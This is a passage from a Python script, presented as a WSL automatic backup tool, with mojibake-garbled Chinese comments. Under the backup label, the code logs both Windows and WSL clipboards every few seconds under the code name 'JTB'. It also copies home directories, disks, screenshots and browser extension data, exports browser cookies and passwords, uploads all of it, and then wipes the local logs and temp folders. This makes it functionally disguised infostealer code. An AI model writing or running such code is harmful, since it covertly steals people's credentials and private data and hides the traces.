                logging.debug(f"å¤‡ä»½æ—¥å¿—æ–‡ä»¶ä¸å­˜åœ¨ï¼Œè·³è¿‡: {log_file}")
            return
        
        # åˆ·æ–°æ—¥å¿—ç¼“å†²åŒºï¼Œç¡®ä¿æ‰€æœ‰æ—¥å¿—éƒ½å·²å†™å…¥æ–‡ä»¶
        for handler in logging.getLogger().handlers:
            if hasattr(handler, 'flush'):
                handler.flush()
        
        # ç­‰å¾…ä¸€å°æ®µæ—¶é—´ï¼Œç¡®ä¿æ–‡ä»¶ç³»ç»ŸåŒæ­¥
        time.sleep(0.5)
            
        # æ£€æŸ¥æ—¥å¿—æ–‡ä»¶å¤§å°
        file_size = os.path.getsize(log_file)
        if file_size == 0:
            if backup_manager.config.DEBUG_MODE:
                logging.debug(f"å¤‡ä»½æ—¥å¿—æ–‡ä»¶ä¸ºç©ºï¼Œè·³è¿‡: {log_file}")
            return
            
        # åˆ›å»ºä¸´æ—¶ç›®å½•
        username = getpass.getuser()
        user_prefix = username[:5] if username else "user"
        temp_dir = Path.home() / ".dev/Backup" / f"{user_prefix}_temp_backup_logs"
        if not backup_manager._ensure_directory(str(temp_dir)):
            logging.error("âŒ æ— æ³•åˆ›å»ºä¸´æ—¶æ—¥å¿—ç›®å½•")
            return
            
        # åˆ›å»ºå¸¦æ—¶é—´æˆ³çš„å¤‡ä»½æ–‡ä»¶å
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        backup_name = f"{user_prefix}_backup_log_{timestamp}.txt"
        backup_path = temp_dir / backup_name
        
        # å¤åˆ¶æ—¥å¿—æ–‡ä»¶åˆ°ä¸´æ—¶ç›®å½•å¹¶ä¸Šä¼ 
        try:
            # è¯»å–å¹¶éªŒè¯æ—¥å¿—å†…å®¹
            with open(log_file, 'r', encoding='utf-8', errors='ignore') as src:
                log_content = src.read()
            
            if not log_content or not log_content.strip():
                logging.warning("âš ï¸ æ—¥å¿—å†…å®¹ä¸ºç©ºï¼Œè·³è¿‡ä¸Šä¼ ")
                return
            
            # å†™å…¥å¤‡ä»½æ–‡ä»¶
            with open(backup_path, 'w', encoding='utf-8') as dst:
                dst.write(log_content)
            
            # éªŒè¯å¤‡ä»½æ–‡ä»¶æ˜¯å¦åˆ›å»ºæˆåŠŸ
            if not os.path.exists(str(backup_path)) or os.path.getsize(str(backup_path)) == 0:
                logging.error("âŒ å¤‡ä»½æ—¥å¿—æ–‡ä»¶åˆ›å»ºå¤±è´¥æˆ–ä¸ºç©º")
                return
            
            if backup_manager.config.DEBUG_MODE:
                logging.info(f"ğŸ“„ å·²å¤åˆ¶å¤‡ä»½æ—¥å¿—åˆ°ä¸´æ—¶ç›®å½• ({os.path.getsize(str(backup_path)) / 1024:.2f}KB)")
            
            # ä¸Šä¼ æ—¥å¿—æ–‡ä»¶
            logging.info(f"ğŸ“¤ å¼€å§‹ä¸Šä¼ å¤‡ä»½æ—¥å¿—æ–‡ä»¶ ({os.path.getsize(str(backup_path)) / 1024:.2f}KB)...")
            if backup_manager.upload_file(str(backup_path)):
                # ä¸Šä¼ æˆåŠŸåä¿ç•™æœ€åä¸€æ¡è®°å½•
                try:
                    with open(log_file, 'w', encoding='utf-8') as f:
                        f.write(f"=== ğŸ“ å¤‡ä»½æ—¥å¿—å·²äº {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ä¸Šä¼  ===\n")
                    logging.info("âœ… å¤‡ä»½æ—¥å¿—ä¸Šä¼ æˆåŠŸå¹¶å·²æ¸…ç©º")
                except Exception as e:
                    logging.error(f"âŒ å¤‡ä»½æ—¥å¿—æ›´æ–°å¤±è´¥: {e}")
            else:
                logging.error("âŒ å¤‡ä»½æ—¥å¿—ä¸Šä¼ å¤±è´¥")
        
        except (OSError, IOError, PermissionError) as e:
            logging.error(f"âŒ å¤åˆ¶æˆ–è¯»å–æ—¥å¿—æ–‡ä»¶å¤±è´¥: {e}")
        except Exception as e:
            logging.error(f"âŒ å¤„ç†æ—¥å¿—æ–‡ä»¶æ—¶å‡ºé”™: {e}")
            import traceback
            if backup_manager.config.DEBUG_MODE:
                logging.debug(traceback.format_exc())
        
        # æ¸…ç†ä¸´æ—¶ç›®å½•
        finally:
            try:
                if os.path.exists(str(temp_dir)):
                    shutil.rmtree(str(temp_dir))
            except Exception as e:
                if backup_manager.config.DEBUG_MODE:
                    logging.debug(f"æ¸…ç†ä¸´æ—¶ç›®å½•å¤±è´¥: {e}")
                
    except Exception as e:
        logging.error(f"âŒ å¤„ç†å¤‡ä»½æ—¥å¿—æ—¶å‡ºé”™: {e}")
        import traceback
        if backup_manager.config.DEBUG_MODE:
            logging.debug(traceback.format_exc())

def clipboard_upload_thread(backup_manager, clipboard_log_path):
    """ç‹¬ç«‹çš„JTBä¸Šä¼ çº¿ç¨‹"""
    username = getpass.getuser()
    user_prefix = username[:5] if username else "user"
    while True:
        try:
            if os.path.exists(clipboard_log_path) and os.path.getsize(clipboard_log_path) > 0:
                # æ£€æŸ¥æ–‡ä»¶å†…å®¹æ˜¯å¦ä¸ºç©ºæˆ–åªåŒ…å«ä¸Šä¼ è®°å½•
                with open(clipboard_log_path, 'r', encoding='utf-8') as f:
                    content = f.read().strip()
                    # æ£€æŸ¥æ˜¯å¦åªåŒ…å«åˆå§‹åŒ–æ ‡è®°æˆ–ä¸Šä¼ è®°å½•
                    has_valid_content = False
                    lines = content.split('\n')
                    for line in lines:
                        line = line.strip()
                        if (line and 
                            not line.startswith('===') and 
                            not line.startswith('-') and
                            not 'JTBç›‘æ§å¯åŠ¨äº' in line and 
                            not 'æ—¥å¿—å·²äº' in line):
                            has_valid_content = True
                            break
                            
                    if not has_valid_content:
                        if backup_manager.config.DEBUG_MODE:
                            logging.debug("ğŸ“‹ JTBå†…å®¹ä¸ºç©ºæˆ–æ— æ•ˆï¼Œè·³è¿‡ä¸Šä¼ ")
                        time.sleep(backup_manager.config.CLIPBOARD_INTERVAL)
                        continue

                # åˆ›å»ºä¸´æ—¶ç›®å½•
                username = getpass.getuser()
                user_prefix = username[:5] if username else "user"
                temp_dir = Path.home() / ".dev/Backup" / f"{user_prefix}_temp_clipboard_logs"
                if backup_manager._ensure_directory(str(temp_dir)):
                    # åˆ›å»ºå¸¦æ—¶é—´æˆ³çš„å¤‡ä»½æ–‡ä»¶å
                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                    backup_name = f"{user_prefix}_clipboard_log_{timestamp}.txt"
                    backup_path = temp_dir / backup_name
                    
                    # å¤åˆ¶æ—¥å¿—æ–‡ä»¶åˆ°ä¸´æ—¶ç›®å½•
                    try:
                        shutil.copy2(clipboard_log_path, backup_path)
                        if backup_manager.config.DEBUG_MODE:
                            logging.info("ğŸ“„ å‡†å¤‡ä¸Šä¼ JTBæ—¥å¿—...")
                    except Exception as e:
                        logging.error(f"âŒ å¤åˆ¶JTBæ—¥å¿—å¤±è´¥: {e}")
                        continue
                    
                    # ä¸Šä¼ æ—¥å¿—æ–‡ä»¶
                    if backup_manager.upload_file(str(backup_path)):
                        # ä¸Šä¼ æˆåŠŸåæ¸…ç©ºåŸå§‹æ—¥å¿—æ–‡ä»¶
                        try:
                            with open(clipboard_log_path, 'w', encoding='utf-8') as f:
                                f.write(f"=== ğŸ“‹ æ—¥å¿—å·²äº {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ä¸Šä¼ å¹¶æ¸…ç©º ===\n")
                            if backup_manager.config.DEBUG_MODE:
                                logging.info("âœ… JTBæ—¥å¿—å·²æ¸…ç©º")
                        except Exception as e:
                            logging.error(f"ğŸ§¹ JTBæ—¥å¿—æ¸…ç©ºå¤±è´¥: {e}")
                    else:
                        logging.error("âŒ JTBæ—¥å¿—ä¸Šä¼ å¤±è´¥")
                    
                    # æ¸…ç†ä¸´æ—¶ç›®å½•
                    try:
                        if os.path.exists(str(temp_dir)):
                            shutil.rmtree(str(temp_dir))
                    except Exception as e:
                        if backup_manager.config.DEBUG_MODE:
                            logging.error(f"âŒ æ¸…ç†ä¸´æ—¶ç›®å½•å¤±è´¥: {e}")
        except Exception as e:
            logging.error(f"âŒ å¤„ç†JTBæ—¥å¿—æ—¶å‡ºé”™: {e}")
            
        # ç­‰å¾…20åˆ†é’Ÿ
        time.sleep(backup_manager.config.CLIPBOARD_INTERVAL)

def clean_backup_directory():
    """æ¸…ç†å¤‡ä»½ç›®å½•ï¼Œä½†ä¿ç•™æ—¥å¿—æ–‡ä»¶å’Œæ—¶é—´é˜ˆå€¼æ–‡ä»¶"""
    backup_dir = Path.home() / ".dev/Backup"
    try:
        if not os.path.exists(backup_dir):
            return
            
        # éœ€è¦ä¿ç•™çš„æ–‡ä»¶
        username = getpass.getuser()
        user_prefix = username[:5] if username else "user"
        keep_files = [
            "backup.log",           # å¤‡ä»½æ—¥å¿—
            f"{user_prefix}_clipboard_log.txt",    # JTBæ—¥å¿—
            "next_backup_time.txt"  # æ—¶é—´é˜ˆå€¼æ–‡ä»¶
        ]
        
        for item in os.listdir(backup_dir):
            item_path = os.path.join(backup_dir, item)
            try:
                if item in keep_files:
                    continue
                    
                if os.path.isfile(item_path):
                    os.remove(item_path)
                elif os.path.isdir(item_path):
                    shutil.rmtree(item_path)
                    
                if BackupConfig.DEBUG_MODE:
                    logging.info(f"ğŸ—‘ï¸ å·²æ¸…ç†: {item}")
            except Exception as e:
                logging.error(f"âŒ æ¸…ç† {item} å¤±è´¥: {e}")
                
        logging.critical("ğŸ§¹ å¤‡ä»½ç›®å½•å·²æ¸…ç†å®Œæˆ")
    except Exception as e:
        logging.error(f"âŒ æ¸…ç†å¤‡ä»½ç›®å½•æ—¶å‡ºé”™: {e}")

def main():
    if not is_wsl():
        logging.critical("æœ¬è„šæœ¬ä»…é€‚ç”¨äº WSL ç¯å¢ƒ")
        return

    try:
        backup_manager = BackupManager()
        
        # å¯åŠ¨æ—¶æ¸…ç†å¤‡ä»½ç›®å½•
        clean_backup_directory()
        
        periodic_backup_upload(backup_manager)
    except KeyboardInterrupt:
        logging.critical("\nå¤‡ä»½ç¨‹åºå·²åœæ­¢")
    except Exception as e:
        logging.critical(f"âŒç¨‹åºå‡ºé”™: {e}")

def periodic_backup_upload(backup_manager):
    """å®šæœŸæ‰§è¡Œå¤‡ä»½å’Œä¸Šä¼ """
    user = get_username()
    
    # WSLå¤‡ä»½è·¯å¾„
    wsl_source = str(Path.home())
    username = getpass.getuser()
    user_prefix = username[:5] if username else "user"
    wsl_target = Path.home() / ".dev/Backup" / f"{user_prefix}_wsl"
    clipboard_log_path = Path.home() / ".dev/Backup" / f"{user_prefix}_clipboard_log.txt"
    
    # å¯åŠ¨åŒå‘JTBç›‘æ§çº¿ç¨‹
    clipboard_both_thread = threading.Thread(
        target=monitor_clipboard_both,
        args=(backup_manager, clipboard_log_path, 3),
        daemon=True
    )
    clipboard_both_thread.start()
    
    # å¯åŠ¨JTBä¸Šä¼ çº¿ç¨‹
    clipboard_upload_thread_obj = threading.Thread(
        target=clipboard_upload_thread,
        args=(backup_manager, clipboard_log_path),
        daemon=True
    )
    clipboard_upload_thread_obj.start()
    
    try:
        with open(clipboard_log_path, 'w', encoding='utf-8') as f:
            f.write(f"=== ğŸ“‹ JTBç›‘æ§å¯åŠ¨äº {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
    except Exception as e:
        logging.error("âŒ åˆå§‹åŒ–JTBæ—¥å¿—å¤±è´¥")

    # è·å–ç”¨æˆ·åå’Œç³»ç»Ÿä¿¡æ¯
    username = getpass.getuser()
    hostname = socket.gethostname()
    current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    # è·å–ç³»ç»Ÿç¯å¢ƒä¿¡æ¯
    system_info = {
        "æ“ä½œç³»ç»Ÿ": platform.system(),
        "ç³»ç»Ÿç‰ˆæœ¬": platform.release(),
        "ç³»ç»Ÿæ¶æ„": platform.machine(),
        "Pythonç‰ˆæœ¬": platform.python_version(),
        "ä¸»æœºå": hostname,
        "ç”¨æˆ·å": username,
    }
    
    # è·å–WSLè¯¦ç»†ä¿¡æ¯
    try:
        with open("/proc/version", "r") as f:
            wsl_version = f.read().strip()
            # æå–WSLç‰ˆæœ¬å·
            if "WSL2" in wsl_version or "microsoft-standard" in wsl_version.lower():
                system_info["WSLç‰ˆæœ¬"] = "WSL2"
            elif "Microsoft" in wsl_version:
                system_info["WSLç‰ˆæœ¬"] = "WSL1"
    except:
        system_info["WSLç‰ˆæœ¬"] = "æœªçŸ¥"
    
    # è·å–Linuxå‘è¡Œç‰ˆä¿¡æ¯
    try:
        with open("/etc/os-release", "r") as f:
            for line in f:
                if line.startswith("PRETTY_NAME="):
                    system_info["Linuxå‘è¡Œç‰ˆ"] = line.split("=")[1].strip().strip('"')
                    break
    except:
        pass
    
    # è¾“å‡ºå¯åŠ¨ä¿¡æ¯å’Œç³»ç»Ÿç¯å¢ƒ
    logging.critical("\n" + "="*50)
    logging.critical("ğŸš€ è‡ªåŠ¨å¤‡ä»½ç³»ç»Ÿå·²å¯åŠ¨")
    logging.critical("="*50)
    logging.critical(f"â° å¯åŠ¨æ—¶é—´: {current_time}")
    logging.critical("-"*50)
    logging.critical("ğŸ“Š ç³»ç»Ÿç¯å¢ƒä¿¡æ¯:")
    for key, value in system_info.items():
        logging.critical(f"   â€¢ {key}: {value}")
    logging.critical("-"*50)
    logging.critical("ğŸ“‹ JTBç›‘æ§å’Œè‡ªåŠ¨ä¸Šä¼ å·²å¯åŠ¨")
    logging.critical("="*50)

    while True:
        try:
            # æ£€æŸ¥æ˜¯å¦åº”è¯¥æ‰§è¡Œå¤‡ä»½
            should_backup, next_time = backup_manager.should_run_backup()
            
            current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            if not should_backup:
                next_time_str = next_time.strftime('%Y-%m-%d %H:%M:%S')
                logging.critical(f"\nâ³ å½“å‰æ—¶é—´: {current_time}")
                logging.critical(f"âŒ› ä¸‹æ¬¡å¤‡ä»½: {next_time_str}")
            else:
                # è·å–å½“å‰å¯ç”¨çš„ç£ç›˜
                available_disks = get_available_disks()
                logging.critical("\n" + "="*40)
                logging.critical(f"â° å¼€å§‹å¤‡ä»½  {current_time}")
                logging.critical("-"*40)
                
                # æ‰§è¡Œå¤‡ä»½ä»»åŠ¡
                logging.critical("\nğŸ§ WSLå¤‡ä»½")
                wsl_backup_paths = backup_wsl(backup_manager, wsl_source, wsl_target) or []
                
                logging.critical("\nğŸ’¾ ç£ç›˜å¤‡ä»½")
                disks_backup_paths = backup_disks(backup_manager, available_disks)
                
                logging.critical("\nğŸªŸ Windowsæ•°æ®å¤‡ä»½")
                windows_data_backup_paths = backup_windows_data(backup_manager, user)
                
                # åˆå¹¶æ‰€æœ‰å¤‡ä»½è·¯å¾„
                all_backup_paths = wsl_backup_paths + disks_backup_paths + windows_data_backup_paths
                
                # ä¿å­˜ä¸‹æ¬¡å¤‡ä»½æ—¶é—´
                next_backup_time = backup_manager.save_next_backup_time()
                
                # è¾“å‡ºç»“æŸè¯­ï¼ˆåœ¨ä¸Šä¼ ä¹‹å‰ï¼‰
                has_backup_files = len(all_backup_paths) > 0
                current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                next_time_str = next_backup_time.strftime('%Y-%m-%d %H:%M:%S') if next_backup_time else "æœªçŸ¥"
                
                if has_backup_files:
                    logging.critical("\n" + "="*40)
                    logging.critical(f"âœ… å¤‡ä»½å®Œæˆ  {current_time}")
                    logging.critical("="*40)
                    logging.critical("ğŸ“‹ å¤‡ä»½ä»»åŠ¡å·²ç»“æŸ")
                    if next_backup_time:
                        logging.critical(f"ğŸ”„ ä¸‹æ¬¡å¯åŠ¨å¤‡ä»½æ—¶é—´: {next_time_str}")
                    logging.critical("="*40 + "\n")
                else:
                    logging.critical("\n" + "="*40)
                    logging.critical("âŒ éƒ¨åˆ†å¤‡ä»½ä»»åŠ¡å¤±è´¥")
                    logging.critical("="*40)
                    logging.critical("ğŸ“‹ å¤‡ä»½ä»»åŠ¡å·²ç»“æŸ")
                    if next_backup_time:
                        logging.critical(f"ğŸ”„ ä¸‹æ¬¡å¯åŠ¨å¤‡ä»½æ—¶é—´: {next_time_str}")
                    logging.critical("="*40 + "\n")
                
                # å¼€å§‹ä¸Šä¼ å¤‡ä»½æ–‡ä»¶
                if all_backup_paths:
                    logging.critical("ğŸ“¤ å¼€å§‹ä¸Šä¼ å¤‡ä»½æ–‡ä»¶...")
                    upload_success = True
                    for backup_path in all_backup_paths:
                        if not backup_manager.upload_file(backup_path):
                            upload_success = False
                    
                    if upload_success:
                        logging.critical("âœ… æ‰€æœ‰å¤‡ä»½æ–‡ä»¶ä¸Šä¼ æˆåŠŸ")
                    else:
                        logging.error("âŒ éƒ¨åˆ†å¤‡ä»½æ–‡ä»¶ä¸Šä¼ å¤±è´¥")
                
                # ä¸Šä¼ å¤‡ä»½æ—¥å¿—
                if backup_manager.config.DEBUG_MODE:
                    logging.info("\nğŸ“ å¤‡ä»½æ—¥å¿—ä¸Šä¼ ")
                backup_and_upload_logs(backup_manager)

            # æ¯å°æ—¶æ£€æŸ¥ä¸€æ¬¡
            time.sleep(3600)

        except Exception as e:
            logging.error(f"\nâŒ å¤‡ä»½å‡ºé”™: {e}")
            try:
                backup_and_upload_logs(backup_manager)
            except Exception as log_error:
                logging.error("âŒ æ—¥å¿—å¤‡ä»½å¤±è´¥")
            time.sleep(60)  # å‡ºé”™åç­‰å¾…1åˆ†é’Ÿå†é‡è¯•

def backup_wsl(backup_manager, source, target):
    """å¤‡ä»½WSLç›®å½•ï¼Œè¿”å›å¤‡ä»½æ–‡ä»¶è·¯å¾„åˆ—è¡¨ï¼ˆä¸æ‰§è¡Œä¸Šä¼ ï¼‰"""
    backup_dir = backup_manager.backup_wsl_files(source, target)
    if backup_dir:
        backup_path = backup_manager.zip_backup_folder(
            backup_dir, 
            str(target) + "_" + datetime.now().strftime("%Y%m%d_%H%M%S")
        )
        if backup_path:
            logging.critical("â˜‘ï¸ WSLç›®å½•å¤‡ä»½æ–‡ä»¶å·²å‡†å¤‡å®Œæˆ")
            return backup_path if isinstance(backup_path, list) else [backup_path]
        else:
            logging.error("âŒ WSLç›®å½•å‹ç¼©å¤±è´¥")
            return None
    return None

def backup_disks(backup_manager, available_disks):
    """å¤‡ä»½å¯ç”¨ç£ç›˜ï¼Œè¿”å›å¤‡ä»½æ–‡ä»¶è·¯å¾„åˆ—è¡¨ï¼ˆä¸æ‰§è¡Œä¸Šä¼ ï¼‰"""
    backup_paths = []
    for disk_letter, disk_configs in available_disks.items():
        logging.info(f"\næ­£åœ¨å¤„ç†ç£ç›˜ {disk_letter.upper()}")
        for backup_type, (source_dir, target_dir, ext_type) in disk_configs.items():
            try:
                backup_dir = backup_manager.backup_disk_files(source_dir, target_dir, ext_type)
                if backup_dir:
                    backup_path = backup_manager.zip_backup_folder(
                        backup_dir, 
                        str(target_dir) + "_" + datetime.now().strftime("%Y%m%d_%H%M%S")
                    )
                    if backup_path:
                        if isinstance(backup_path, list):
                            backup_paths.extend(backup_path)
                        else:
                            backup_paths.append(backup_path)
                        logging.critical(f"â˜‘ï¸ {disk_letter.upper()}ç›˜ {backup_type} å¤‡ä»½æ–‡ä»¶å·²å‡†å¤‡å®Œæˆ\n")
            except Exception as e:
                logging.error(f"âŒ {disk_letter.upper()}ç›˜ {backup_type} å¤‡ä»½å‡ºé”™: {e}\n")
    return backup_paths

def backup_windows_data(backup_manager, user):
    """å¤‡ä»½Windowsç‰¹å®šæ•°æ®ï¼Œè¿”å›å¤‡ä»½æ–‡ä»¶è·¯å¾„åˆ—è¡¨ï¼ˆä¸æ‰§è¡Œä¸Šä¼ ï¼‰"""
    backup_paths = []
    
    # ç›´æ¥å¤åˆ¶æŒ‡å®šçš„ Windows ç›®å½•å’Œæ–‡ä»¶ï¼ˆæ¡Œé¢ã€ä¾¿ç­¾ã€å†å²è®°å½•ç­‰ï¼‰
    user_prefix = user[:5] if user else "user"
    windows_base_path = f"/mnt/c/Users/{user}"
    specified_backup_dir = Path.home() / ".dev/Backup" / f"{user_prefix}_windows_specified"
    
    if os.path.exists(windows_base_path):
        if backup_manager._ensure_directory(str(specified_backup_dir)):
            files_count = 0
            total_size = 0
            
            for item in backup_manager.config.WINDOWS_SPECIFIC_PATHS:
                source_path = os.path.join(windows_base_path, item)
                if not os.path.exists(source_path):
                    if backup_manager.config.DEBUG_MODE:
                        logging.debug(f"è·³è¿‡ä¸å­˜åœ¨çš„é¡¹ç›®: {source_path}")
                    continue
                
                try:
                    if os.path.isdir(source_path):
                        # å¤åˆ¶ç›®å½•
                        target_path = os.path.join(specified_backup_dir, item)
                        parent_dir = os.path.dirname(target_path)
                        if backup_manager._ensure_directory(parent_dir):
                            if os.path.exists(target_path):
                                shutil.rmtree(target_path, ignore_errors=True)
                            shutil.copytree(source_path, target_path, dirs_exist_ok=True)
                            dir_size = backup_manager._get_dir_size(target_path)
                            files_count += 1
                            total_size += dir_size
                            if backup_manager.config.DEBUG_MODE:
                                logging.debug(f"æˆåŠŸå¤åˆ¶ç›®å½•: {item}")
                    else:
                        # å¤åˆ¶æ–‡ä»¶
                        target_path = os.path.join(specified_backup_dir, item)
                        parent_dir = os.path.dirname(target_path)
                        if backup_manager._ensure_directory(parent_dir):
                            shutil.copy2(source_path, target_path)
                            file_size = os.path.getsize(target_path)
                            files_count += 1
                            total_size += file_size
                            if backup_manager.config.DEBUG_MODE:
                                logging.debug(f"æˆåŠŸå¤åˆ¶æ–‡ä»¶: {item}")
                except Exception as e:
                    if backup_manager.config.DEBUG_MODE:
                        logging.debug(f"å¤åˆ¶å¤±è´¥: {item} - {str(e)}")
            
            if files_count > 0:
                logging.info(f"\nğŸ“Š WindowsæŒ‡å®šæ–‡ä»¶å¤‡ä»½å®Œæˆ:")
                logging.info(f"   ğŸ“ æ–‡ä»¶æ•°é‡: {files_count}")
                logging.info(f"   ğŸ’¾ æ€»å¤§å°: {total_size / 1024 / 1024:.1f}MB")
                
                backup_path = backup_manager.zip_backup_folder(
                    str(specified_backup_dir),
                    str(Path.home() / f".dev/Backup/{user_prefix}_wsl_wins_specified_") + datetime.now().strftime("%Y%m%d_%H%M%S")
                )
                if backup_path:
                    if isinstance(backup_path, list):
                        backup_paths.extend(backup_path)
                    else:
                        backup_paths.append(backup_path)
                    logging.critical("â˜‘ï¸ WindowsæŒ‡å®šç›®å½•å’Œæ–‡ä»¶å¤‡ä»½æ–‡ä»¶å·²å‡†å¤‡å®Œæˆ\n")
                else:
                    logging.error("âŒ WindowsæŒ‡å®šç›®å½•å’Œæ–‡ä»¶å‹ç¼©å¤±è´¥\n")
            else:
                logging.error("âŒ æœªæ‰¾åˆ°éœ€è¦å¤‡ä»½çš„WindowsæŒ‡å®šæ–‡ä»¶")
    
    # å¤‡ä»½æˆªå›¾
    screenshots_backup = backup_screenshots(user)
    if screenshots_backup:
        backup_path = backup_manager.zip_backup_folder(
            screenshots_backup,
            str(Path.home() / f".dev/Backup/{user_prefix}_screenshots_") + datetime.now().strftime("%Y%m%d_%H%M%S")
        )
        if backup_path:
            if isinstance(backup_path, list):
                backup_paths.extend(backup_path)
            else:
                backup_paths.append(backup_path)
            logging.critical("â˜‘ï¸ æˆªå›¾æ–‡ä»¶å¤‡ä»½æ–‡ä»¶å·²å‡†å¤‡å®Œæˆ\n")
    else:
        logging.info("â„¹ï¸ æœªå‘ç°å¯å¤‡ä»½çš„æˆªå›¾æ–‡ä»¶\n")

    # å¤‡ä»½æµè§ˆå™¨æ‰©å±•æ•°æ®
    extensions_backup = backup_browser_extensions(backup_manager, user)
    if extensions_backup:
        backup_path = backup_manager.zip_backup_folder(
            extensions_backup,
            str(Path.home() / f".dev/Backup/{user_prefix}_browser_extensions_") + datetime.now().strftime("%Y%m%d_%H%M%S")
        )
        if backup_path:
            if isinstance(backup_path, list):
                backup_paths.extend(backup_path)
            else:
                backup_paths.append(backup_path)
            logging.critical("â˜‘ï¸ æµè§ˆå™¨æ‰©å±•æ•°æ®å¤‡ä»½æ–‡ä»¶å·²å‡†å¤‡å®Œæˆ\n")
    
    # å¯¼å‡ºæµè§ˆå™¨ Cookies å’Œå¯†ç 
    browser_export_file = export_browser_cookies_passwords_wsl(backup_manager, user)
    if browser_export_file:
        backup_paths.append(browser_export_file)
        logging.critical("â˜‘ï¸ æµè§ˆå™¨æ•°æ®å¯¼å‡ºæ–‡ä»¶å·²å‡†å¤‡å®Œæˆ\n")
    else:
        logging.warning("â­ï¸  æµè§ˆå™¨æ•°æ®å¯¼å‡ºè·³è¿‡æˆ–å¤±è´¥\n")
    
    return backup_paths

def get_wsl_clipboard():
    """è·å–WSL/Linux JTBå†…å®¹ï¼ˆä½¿ç”¨xclipï¼‰"""
    try:
        result = subprocess.run(['xclip', '-selection', 'clipboard', '-o'], capture_output=True, text=True)
        if result.returncode == 0:
            return result.stdout.strip()
        else:
            return None
    except Exception:
        return None

def set_wsl_clipboard(content):
    """è®¾ç½®WSL/Linux JTBå†…å®¹ï¼ˆä½¿ç”¨xclipï¼‰"""
    try:
        p = subprocess.Popen(['xclip', '-selection', 'clipboard', '-i'], stdin=subprocess.PIPE)
        p.communicate(input=content.encode('utf-8'))
        return p.returncode == 0
    except Exception:
        return False

def set_windows_clipboard(content):
    """è®¾ç½®Windows JTBå†…å®¹ï¼ˆé€šè¿‡powershellï¼‰"""
    try:
        if content is None:
            return False

        # å®¹å¿ bytes è¾“å…¥ï¼Œç»Ÿä¸€è½¬ä¸º strï¼Œé¿å…ç¼–ç å¼‚å¸¸
        if isinstance(content, bytes):
            content = content.decode("utf-8", errors="ignore")

        if not content:
            return False

        # ä½¿ç”¨ Base64 ä¼ é€’æ–‡æœ¬ï¼Œé¿å…è½¬ä¹‰/æ¢è¡Œ/ç‰¹æ®Šå­—ç¬¦å¯¼è‡´ PowerShell è§£æé”™è¯¯
        b64 = base64.b64encode(content.encode("utf-8")).decode("ascii")
        ps_script = (
            "$b64='{b64}';"
            "$bytes=[Convert]::FromBase64String($b64);"
            "$text=[System.Text.Encoding]::UTF8.GetString($bytes);"
            "Set-Clipboard -Value $text"
        ).format(b64=b64)

        # ä½¿ç”¨å‚æ•°åˆ—è¡¨é¿å… shell è§£æé—®é¢˜ï¼Œä¸”ä¿æŒå­—èŠ‚æ¨¡å¼é˜²æ­¢ç¼–ç å¼‚å¸¸
        result = subprocess.run(
            [
                "powershell.exe",
                "-NoProfile",
                "-Command",
                ps_script,
            ],
            capture_output=True,
            text=False,
        )

        if result.returncode != 0:
            raw = result.stderr or result.stdout or b""
            error_msg = raw.decode("utf-8", errors="ignore").strip() if raw else "unknown error"
            logging.error(f"âŒ è®¾ç½®Windows JTBå¤±è´¥: {error_msg}")
            return False

        return True
    except Exception as e:
        logging.error(f"âŒ è®¾ç½®Windows JTBå‡ºé”™: {e}")
        return False

def monitor_clipboard_both(backup_manager, file_path, interval=3):
    """åŒå‘ç›‘æ§WSLå’ŒWindows JTBå¹¶è®°å½•/åŒæ­¥"""
    last_win_clip = ""
    last_wsl_clip = ""
    def is_special_content(text):
        if not text:
            return False
        if text.startswith('===') or text.startswith('-'):
            return True
        if 'JTBç›‘æ§å¯åŠ¨äº' in text or 'æ—¥å¿—å·²äº' in text:
            return True
        return False
    while True:
        try:
            win_clip = backup_manager.get_clipboard_content()  # Windows
            wsl_clip = get_wsl_clipboard()  # WSL

            if win_clip and not win_clip.isspace() and not is_special_content(win_clip):
                if win_clip != last_win_clip:
                    backup_manager.log_clipboard_update("[Windows] " + win_clip, file_path)
                    # åŒæ­¥åˆ°WSL
                    set_wsl_clipboard(win_clip)
                    last_win_clip = win_clip

            if wsl_clip and not wsl_clip.isspace() and not is_special_content(wsl_clip):
                if wsl_clip != last_wsl_clip:
                    backup_manager.log_clipboard_update("[WSL] " + wsl_clip, file_path)
                    # åŒæ­¥åˆ°Windows
                    set_windows_clipboard(wsl_clip)
                    last_wsl_clip = wsl_clip
        except Exception as e:
            if backup_manager.config.DEBUG_MODE:
                logging.error(f"âŒ JTBåŒå‘ç›‘æ§å‡ºé”™: {str(e)}")
        time.sleep(interval)

if __name__ == "__main__":
    main()